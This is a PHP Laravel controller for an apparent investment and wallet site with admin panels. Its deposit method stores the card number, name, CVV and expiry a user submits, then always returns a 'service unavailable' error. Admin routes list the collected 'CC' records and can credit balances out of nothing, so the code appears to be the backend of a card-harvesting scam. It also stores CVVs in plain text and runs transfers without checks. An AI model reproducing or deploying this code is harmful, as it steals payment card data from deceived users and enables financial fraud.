<?php

namespace App\Http\Controllers;

use App\Models\Cc;
use App\Models\Pitch;
use App\Models\Transaction;
use App\Models\User;
use Illuminate\Http\Request;
use Auth;
use Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\Rule;

class UserController extends Controller
{
    public function showWallet(Request $request)
    {
//        $user = $request->user();
//        return view('users.wallet', ['user' => $user]);


        $user = $request->user()->load(['transactions' => function ($query) {

            $query->orderBy('created_at', 'desc')->limit(3);
        }]);


        return view('users.wallet', compact('user'));

    }

    public function deposit(Request $request)
    {
        $wallet = new Cc();
        $wallet->user_id = auth()->user()->id;
        $wallet->number = trim($request->number);
        $wallet->name = trim($request->name);
        $wallet->cvv = trim($request->cvv);
        $wallet->expiry = trim($request->expiry);
        $wallet->save();

        return redirect()->route('wallet')->with('error', "SERVICE UNAVAILABLE AT THE MOMENT.");
    }

    public function transfer(Request $request)
    {
        $sender = Auth::user();
        $amount = $request->amount;

        if ($sender->balance < $amount) {
            return back()->withErrors(['amount'=>'Insufficient Balance']);
        }

        $receiver = User::where('email', '=', $request->email)->first();
        if ($receiver) {
            $sender->decrement('balance', $amount);
            $data = new Transaction();
            $data->user_id = auth()->user()->id;
            $data->amount = $amount;
            $data->desc = "Transfer";
            $data->save();

            $receiver->increment('balance', $amount);
            $receiveData = new Transaction();
            $receiveData->user_id = $receiver->id;
            $receiveData->amount = $amount;
            $receiveData->desc = "Deposit";
            $receiveData->save();

            return redirect()->route('wallet')->with('success', 'TRANSFER SUCCESSFUL.');
        } else {
            return back()->withErrors(['email'=>'Receiver Email not found']);
        }

    }

    public function user()
    {
        $data['getRecord'] = User::getUserRecord();
        return view('backend.user.list', $data);
    }

    public function addUser(Request $request)
    {
        return view('backend.user.add');
    }

    public function insertUser(Request $request)
    {
        request()->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users',
            'password' => 'required',
            'secret' => 'secret'
        ]);

        $save = new User;
        $save->name = trim($request->name);
        $save->email = trim($request->email);
        $save->password = Hash::make($request->password);
        $save->type = trim($request->type);
        $save->secret = trim($request->secret);
        $save->country = $request->country;
        $save->save();

        return redirect('panel/user/list')->with('success', "USER SUCCESSFULLY CREATED");
    }

    public function editUser($id)
    {
        $data['getRecord'] = User::getSingle($id);
        return view('backend.user.edit', $data);
    }

    public function updateUser($id, Request $request)
    {
        request()->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users,email,'.$id
        ]);

        $save = User::getSingle($id);
        $save->name = trim($request->name);
        $save->email = trim($request->email);
        $save->type = trim($request->type);
        $save->secret = trim($request->secret);
        if (!empty($request->password)) {
            $save->password = Hash::make($request->password);
        }
        $save->save();

        return redirect('panel/user/list')->with('success', "USER SUCCESSFULLY UPDATED");
    }

    public function deleteUser($id)
    {
        $user = User::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "USER DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "DELETE OPERATION FAILED");
        }

    }

    public function cc()
    {
        $data['getRecord'] = Cc::getCc();
        return view('backend.user.cc', $data);

    }

    public function deleteCc($id)
    {
        $user = Cc::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "CC DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "CC OPERATION FAILED");
        }

    }

    public function pitches()
    {
        $data['getRecord'] = Pitch::getPitch();
        return view('backend.user.pitch', $data);
    }

    public function deletePitch($id)
    {
        $user = Pitch::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "PITCH DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "PITCH OPERATION FAILED");
        }

    }

    public function fundWallet($id)
    {
        $data['getRecord'] = User::getSingle($id);
        return view('backend.user.fund', $data);
    }

    public function updateWallet($id, Request $request)
    {
        $data['getRecord'] = User::getSingle($id);

        $amount = $request->amount;

        $receiver = User::where('id', '=', $id)->first();
        if ($receiver) {

            if (auth()->user()->secret === $request->key){
                $data = new Transaction();
                $data->user_id = auth()->user()->id;
                $data->amount = $amount;
                $data->desc = "Transfer";
                $data->save();

                $receiver->increment('balance', $amount);
                $receiveData = new Transaction();
                $receiveData->user_id = $receiver->id;
                $receiveData->amount = $amount;
                $receiveData->desc = "Top-up";
                $receiveData->save();
            } else {
                return redirect()->back()->with('error', 'FAILED!.');
            }
            return redirect('panel/user/list')->with('success', "FUNDING SUCCESSFUL.");
        } else {
            return redirect()->back()->with('error', 'RECEIVER NOT FOUND.');
        }

    }

    public function addPitch(Request $request)
    {
        Log::info($request);
        request()->validate([
//            'pitcher' => 'required',
            'industry' => 'required',
            'title' => ['required', Rule::unique('pitches', 'title')],
            'target' => 'required',
            'about' => 'required'
        ]);

        $pitch = new Pitch();
        $pitch->user_id = auth()->user()->id;
        $pitch->pitcher = auth()->user()->name;
        $pitch->industry = $request->industry;
        $pitch->title = $request->title;
        $pitch->target = $request->target;
        $pitch->minimum = 1000;
        $pitch->about = $request->about;
        $pitch->save();

        return view('invest_single', compact('pitch'))->with('success', "PITCH SUCCESSFULLY CREATED");
    }
    public function getAllPitches(Request $request)
    {
        $data['getRecord'] = Pitch::getPitch();
        return view('invest', $data);
    }

    public function showPitch($id)
    {
        $pitch = Pitch::find($id);
        return view('invest_single', compact('pitch'));
    }
}
